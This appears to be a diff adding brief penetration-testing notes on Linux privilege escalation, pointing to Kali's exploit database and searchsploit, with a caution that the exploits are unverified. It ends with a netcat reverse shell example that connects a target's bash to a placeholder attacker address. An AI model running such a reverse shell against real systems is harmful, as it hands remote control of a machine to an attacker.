@@ -1,0 +1,23 @@
+== Privilege escalation on linux systems ==
+
+Kali has a DB of ___UNVERIFIED___ linux exploits under:
+
+		/user/share/exploitdb
+
+
+	-- Use those at your own risk.
+	It might work. It might wipe your root drive. (Check the code at least)
+
+Search as follows:
+
+# /usr/share/exploitdb/searchsploit <term>
+
+Note: example of reverse TCP on linux:
+
+	## On the target:
+	nc <attackr_ip> <port> -e /bin/bash
+
+	## On the attacker:
+	nc -lvp <port>
+
+
